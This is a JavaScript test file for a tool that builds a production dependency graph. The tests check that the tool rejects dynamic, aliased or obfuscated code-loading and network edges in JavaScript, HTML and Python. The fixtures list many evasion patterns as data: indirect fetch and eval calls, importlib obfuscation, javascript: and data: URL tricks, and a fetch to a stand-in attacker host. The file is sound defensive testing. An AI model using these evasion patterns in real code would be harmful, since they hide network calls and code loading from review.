import assert from 'node:assert/strict';
import { mkdtemp, mkdir, readFile, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import test from 'node:test';

import { buildProductionGraph } from './helpers/import-graph.js';

const FIXTURE = new URL('./fixtures/production-graph/graph-fixture.json', import.meta.url);

async function materialize(files) {
  const root = await mkdtemp(join(tmpdir(), 'flock-production-graph-'));
  for (const [path, source] of Object.entries(files)) {
    await mkdir(join(root, dirname(path)), { recursive: true });
    await writeFile(join(root, path), source);
  }
  return root;
}

test('production graph covers every declared browser, CSS, JS, asset, and Python edge', async () => {
  const fixture = JSON.parse(await readFile(FIXTURE, 'utf8'));
  const root = await materialize(fixture.files);
  const graph = buildProductionGraph({ repoRoot: root, roots: fixture.roots });
  assert.deepEqual(new Set(graph.edges.map(({ kind }) => kind)), new Set(fixture.edgeKinds));
  assert.deepEqual(graph.files, [...Object.keys(fixture.files)].sort());
  assert.match(graph.sha256, /^[0-9a-f]{64}$/);
  assert.equal(buildProductionGraph({ repoRoot: root, roots: fixture.roots }).sha256, graph.sha256);
});

test('production graph fails closed for every non-literal executable edge', async () => {
  for (const source of [
    'import(path)',
    'import(`./${path}.js`)',
    'new URL(path, import.meta.url)',
    'const AssetURL = URL; new AssetURL("./hidden.js", import.meta.url)',
    'const U = globalThis.URL; new U("./hidden.js", import.meta.url)',
    'const { URL: U } = globalThis; new U("./hidden.js", import.meta.url)',
    'new Worker(path)',
    'new window.Worker(path)',
    'new window["Worker"](path)',
    'new SharedWorker(path)',
    'new globalThis.SharedWorker(path)',
    'context.audioWorklet.addModule(path)',
    'fetch(path)',
    'window.fetch(path)',
    'window["fetch"](path)',
    'window.fetch.call(window, path)',
    'fetch.call(null, path)',
    'const request = window.fetch; request(path)',
    'const request = fetch; request(path)',
    'window[capability](path)',
    'const request = window[capability]; request(path)',
    'const request = window["f" + "etch"]; request(path)',
    'context.audioWorklet["addModule"](path)',
    'context.audioWorklet.addModule.call(context.audioWorklet, path)',
    'const add = context.audioWorklet.addModule; add(path)',
    'context.audioWorklet[capability](path)',
    'const W = window.Worker; new W(path)',
    'const W = globalThis[capability]; new W(path)',
    'Reflect.get(window, "fetch")(path)',
    'const W = Reflect.get(window, "Worker"); new W(path)',
    'Reflect.get(context.audioWorklet, "addModule")(path)',
    'Reflect.get((0, window), "fetch")(path)',
    'Reflect.get([window][0], "fetch")(path)',
    'const get = Reflect.get; get(window, "fetch")(path)',
    'Object.getOwnPropertyDescriptor(window, "fetch").value(path)',
    'const {["fetch"]: request} = window; request(path)',
    'const w = window; const request = w.fetch; request(path)',
    'const w = globalThis; new w.Worker(path)',
    'const R = Reflect; R.get(window, "fetch")(path)',
    'const { get } = Reflect; get(window, "fetch")(path)',
    'const { getOwnPropertyDescriptor } = Object; getOwnPropertyDescriptor(window, "fetch").value(path)',
    'window.window.fetch(path)',
    'new window.window.Worker(path)',
    'const w = true ? window : window; w.fetch(path)',
    'const w = [window][0]; w.fetch(path)',
    'const w = (0, window); w.fetch(path)',
    'const [w] = [window]; new w.Worker(path)',
    'const R = true && Reflect; R.get(window, "fetch")(path)',
    'eval("fetch(path)")',
    'new Function("fetch(path)")',
    'const e = eval; e("import(\\"./hidden.js\\")")',
    'const F = Function; new F("fetch(path)")',
    'const box = { w: window }; box.w.fetch(path)',
    'function id(x) { return x; } id(window).fetch(path)',
    'function id(x) { return x; } const w = id(window); w.fetch(path)',
    'const getWindow = () => window; getWindow().fetch(path)',
    'function id(x) { return x; } const id2 = id; const w = id2(window); w.fetch(path)',
    'const getWindow = () => window; function id(x) { return x; } const w = id(getWindow()); w.fetch(path)',
    'const api = { id(x) { return x; } }; const w = api.id(window); w.fetch(path)',
    'class Api { id(x) { return x; } } const api = new Api(); const w = api.id(window); w.fetch(path)',
    'document.defaultView.fetch(path)',
    'Reflect.get(window, "eval")("fetch(path)")',
    'Reflect.get(window, "Function")("fetch(path)")()',
    'document.defaultView.eval("fetch(path)")',
    'function id(x) { return x; } id(window).eval("fetch(path)")',
    'fetch("https://attacker.invalid/collect")',
    'import("https://example.invalid/module.js")',
    'const asset = `assets/${name}.png`',
  ]) {
    const root = await materialize({ 'index.html': '<script type="module" src="./main.js"></script>',
      'main.js': source });
    assert.throws(() => buildProductionGraph({ repoRoot: root,
      roots: [{ kind: 'html', path: 'index.html' }] }),
    { code: 'PRODUCTION_GRAPH_UNRESOLVED_EDGE' }, source);
  }
  const pythonRoot = await materialize({ 'main.py': 'import importlib\nimportlib.import_module(name)\n' });
  assert.throws(() => buildProductionGraph({ repoRoot: pythonRoot,
    roots: [{ kind: 'python', path: 'main.py' }] }), { code: 'PRODUCTION_GRAPH_UNRESOLVED_EDGE' });
  for (const source of [
    'import importlib as il\nil.import_module(name)\n',
    'from importlib import import_module as load\nload(name)\n',
    'import builtins as b\nb.__import__(name)\n',
    'import importlib\nload = getattr(importlib, "import_module")\nload(name)\n',
    'import importlib\nload = getattr(importlib, "import_" + "module")\nload(name)\n',
    'import importlib\ng = getattr\nload = g(importlib, name)\nload(name)\n',
    'import importlib\nimportlib.__dict__["import_module"](name)\n',
    'import importlib\nvars(importlib)["import_module"](name)\n',
    'import importlib\nimportlib.__getattribute__("import_module")(name)\n',
    'import importlib\nmod = importlib\nmod.import_module(name)\n',
    'from importlib import import_module\nload = import_module\nload(name)\n',
    'import importlib\nd = vars(importlib)\nd["import_module"](name)\n',
    'import importlib\nload = importlib.import_module\nload(name)\n',
    'import importlib\nd = importlib.__dict__\nd["import_module"](name)\n',
    'import importlib\n(mod,) = (importlib,)\nmod.import_module(name)\n',
    'from builtins import getattr as g\nimport importlib\ng(importlib, name)(path)\n',
    'from builtins import vars as v\nimport importlib\nv(importlib)[name](path)\n',
    'import builtins, importlib\ng = builtins.getattr\ng(importlib, name)(path)\n',
    'import builtins, importlib\nv = builtins.vars\nv(importlib)[name](path)\n',
    'import importlib\n(load,) = (importlib.import_module,)\nload(name)\n',
    'import importlib\nmod = importlib if flag else importlib\nmod.import_module(name)\n',
    'import importlib\nmod = [importlib][0]\nmod.import_module(name)\n',
    'import importlib\ngetattr([importlib][0], name)(path)\n',
    'import importlib\ngetattr(importlib if flag else importlib, name)(path)\n',
    'import importlib\nclass Box: pass\nb = Box()\nb.mod = importlib\nb.mod.import_module(name)\n',
    'import importlib\nmod = ident(x=importlib)\nmod.import_module(name)\n',
    'import importlib\nclass Box: pass\nb = Box()\nb.mod = importlib\nc = b\nc.mod.import_module(name)\n',
    'exec("import hidden")\n',
    'eval("__import__(name)")\n',
    'exec(compile("import hidden", "<x>", "exec"))\n',
    'import importlib\nclass Box: pass\nb = Box()\nsetattr(b, "mod", importlib)\nb.mod.import_module(name)\n',
    'import importlib\nboxes = [object()]\nboxes[0].mod = importlib\nboxes[0].mod.import_module(name)\n',
    'import importlib\nbox = {}\nbox["mod"] = importlib\nbox["mod"].import_module(name)\n',
    'import importlib\nbox = {}\nbox[key] = importlib\nbox[key].import_module(name)\n',
    'import importlib\nbox = {}\nbox["mod"] = importlib\nalias = box\nalias["mod"].import_module(name)\n',
    'import importlib\nclass Box: pass\nb = Box()\nput = setattr\nput(b, "mod", importlib)\nb.mod.import_module(name)\n',
    'import importlib\nclass Box: pass\nb = Box()\nb.__dict__["mod"] = importlib\nb.mod.import_module(name)\n',
    'import importlib\nobject.__getattribute__(importlib, "import_module")(name)\n',
    'import importlib\nclass Box: pass\nb = Box()\nobject.__setattr__(b, "mod", importlib)\nb.mod.import_module(name)\n',
    'import importlib\nclass Box: pass\nb = Box()\nvars(b)["mod"] = importlib\nb.mod.import_module(name)\n',
    'import importlib\nclass Box: pass\nb = Box()\nb.__dict__.update({"mod": importlib})\nb.mod.import_module(name)\n',
  ]) {
    const root = await materialize({ 'main.py': source });
    assert.throws(() => buildProductionGraph({ repoRoot: root,
      roots: [{ kind: 'python', path: 'main.py' }] }),
    { code: 'PRODUCTION_GRAPH_UNRESOLVED_EDGE' }, source);
  }
});

test('browser capability restrictions do not reject Node provider injection', async () => {
  const root = await materialize({
    'server.js': 'export function request(fetchImpl = globalThis.fetch, url) { return fetchImpl(url); }',
  });
  const graph = buildProductionGraph({ repoRoot: root,
    roots: [{ kind: 'node', path: 'server.js' }] });
  assert.deepEqual(graph.files, ['server.js']);
});

test('explicit browser-library realm records configurable capability edges', async () => {
  const root = await materialize({
    'server.js': 'new URL("./client.js", import.meta.url);',
    'client.js': 'fetch(url); context.audioWorklet.addModule(workletUrl);',
  });
  const graph = buildProductionGraph({ repoRoot: root,
    roots: [{ kind: 'node', path: 'server.js' }],
    realmOverrides: { 'client.js': 'browser-library' } });
  assert.deepEqual(graph.edges.filter(({ source }) => source === 'client.js')
    .map(({ resolved }) => resolved).sort(), [
    'external:configurable-audio-worklet', 'external:configurable-fetch',
  ]);
  await writeFile(join(root, 'dep.js'), 'fetch(path);');
  await writeFile(join(root, 'client.js'), 'import "./dep.js"; fetch(url);');
  assert.throws(() => buildProductionGraph({ repoRoot: root,
    roots: [{ kind: 'node', path: 'server.js' }],
    realmOverrides: { 'client.js': 'browser-library' } }),
  { code: 'PRODUCTION_GRAPH_UNRESOLVED_EDGE' });
});

test('Node-served JavaScript requires an explicit browser realm', async () => {
  const root = await materialize({
    'server.js': 'new URL("./client.js", import.meta.url);',
    'client.js': 'fetch(path);',
  });
  assert.throws(() => buildProductionGraph({ repoRoot: root,
    roots: [{ kind: 'node', path: 'server.js' }] }),
  { code: 'PRODUCTION_GRAPH_UNRESOLVED_EDGE' });
  assert.throws(() => buildProductionGraph({ repoRoot: root,
    roots: [{ kind: 'node', path: 'server.js' }], realmOverrides: { 'client.js': 'browser' } }),
  { code: 'PRODUCTION_GRAPH_UNRESOLVED_EDGE' });
  const aliasRoot = await materialize({
    'server.js': 'const AssetURL = URL; new AssetURL("./client.js", import.meta.url);',
    'client.js': 'export {};',
  });
  assert.throws(() => buildProductionGraph({ repoRoot: aliasRoot,
    roots: [{ kind: 'node', path: 'server.js' }] }),
  { code: 'PRODUCTION_GRAPH_UNRESOLVED_EDGE' });
});

test('HTML discovered from a Node static route still enforces browser restrictions', async () => {
  const root = await materialize({
    'server.js': 'new URL("./index.html", import.meta.url);',
    'index.html': '<script type="module" src="./browser.js"></script>',
    'browser.js': 'const request = window.fetch; request(path);',
  });
  assert.throws(() => buildProductionGraph({ repoRoot: root,
    roots: [{ kind: 'node', path: 'server.js' }] }), { code: 'PRODUCTION_GRAPH_UNRESOLVED_EDGE' });
});

test('protocol-qualified HTML executable edges fail closed', async () => {
  const root = await materialize({
    'index.html': '<!doctype html><script src="https://example.invalid/app.js"></script>',
  });
  assert.throws(() => buildProductionGraph({ repoRoot: root,
    roots: [{ kind: 'html', path: 'index.html' }] }), { code: 'PRODUCTION_GRAPH_UNRESOLVED_EDGE' });
  for (const html of [
    '<button onclick="fetch(path)">x</button>',
    '<a href="javascript:fetch(path)">x</a>',
    '<a href="java&#x09;script:fetch(path)">x</a>',
    '<iframe srcdoc="&lt;script&gt;fetch(path)&lt;/script&gt;"></iframe>',
    '<iframe src="data:text/html,&lt;script&gt;fetch(path)&lt;/script&gt;"></iframe>',
    '<object data="data:text/html,&lt;script&gt;fetch(path)&lt;/script&gt;"></object>',
  ]) {
    const executable = await materialize({ 'index.html': html });
    assert.throws(() => buildProductionGraph({ repoRoot: executable,
      roots: [{ kind: 'html', path: 'index.html' }] }),
    { code: 'PRODUCTION_GRAPH_UNRESOLVED_EDGE' });
  }
  const mixedMime = await materialize({
    'index.html': '<script type="Text/JavaScript">fetch(path)</script>',
  });
  assert.throws(() => buildProductionGraph({ repoRoot: mixedMime,
    roots: [{ kind: 'html', path: 'index.html' }] }),
  { code: 'PRODUCTION_GRAPH_UNRESOLVED_EDGE' });
  for (const type of ['text/ecmascript', 'application/ecmascript',
    'application/x-javascript', 'text/jscript', 'text/livescript']) {
    const legacyMime = await materialize({
      'index.html': `<script type="${type}">fetch(path)</script>`,
    });
    assert.throws(() => buildProductionGraph({ repoRoot: legacyMime,
      roots: [{ kind: 'html', path: 'index.html' }] }),
    { code: 'PRODUCTION_GRAPH_UNRESOLVED_EDGE' }, type);
  }
});

test('production graph rejects unresolved, wrong-case, and symlink edges', async () => {
  const unresolved = await materialize({ 'index.html': '<script type="module" src="./missing.js"></script>' });
  assert.throws(() => buildProductionGraph({ repoRoot: unresolved,
    roots: [{ kind: 'html', path: 'index.html' }] }), { code: 'PRODUCTION_GRAPH_UNRESOLVED_EDGE' });

  const wrongCase = await materialize({ 'index.html': '<script type="module" src="./main.js"></script>',
    'Main.js': 'export {}' });
  assert.throws(() => buildProductionGraph({ repoRoot: wrongCase,
    roots: [{ kind: 'html', path: 'index.html' }] }), { code: 'PRODUCTION_GRAPH_UNRESOLVED_EDGE' });

  const linked = await materialize({ 'index.html': '<script type="module" src="./link.js"></script>',
    'real.js': 'export {}' });
  await symlink(join(linked, 'real.js'), join(linked, 'link.js'));
  assert.throws(() => buildProductionGraph({ repoRoot: linked,
    roots: [{ kind: 'html', path: 'index.html' }] }), { code: 'PRODUCTION_GRAPH_UNRESOLVED_EDGE' });
});

test('inline HTML JavaScript and CSS edges retain absolute source lines', async () => {
  const root = await materialize({
    'index.html': '<!doctype html>\n<style>\n.x{background:url("./image.png")}\n</style>\n<script>\nfetch("./data.json")\n</script>',
    'image.png': 'fixture',
    'data.json': '{}',
  });
  const graph = buildProductionGraph({ repoRoot: root,
    roots: [{ kind: 'html', path: 'index.html' }] });
  assert.equal(graph.edges.find(({ kind }) => kind === 'css.url').line, 3);
  assert.equal(graph.edges.find(({ kind }) => kind === 'js.fetch').line, 6);

  const malformed = await materialize({
    'index.html': '<!doctype html>\n<div></div>\n<div></div>\n<style>\n.x{background:url(\n</style>',
  });
  assert.throws(() => buildProductionGraph({ repoRoot: malformed,
    roots: [{ kind: 'html', path: 'index.html' }] }), /index\.html:5:/);
});
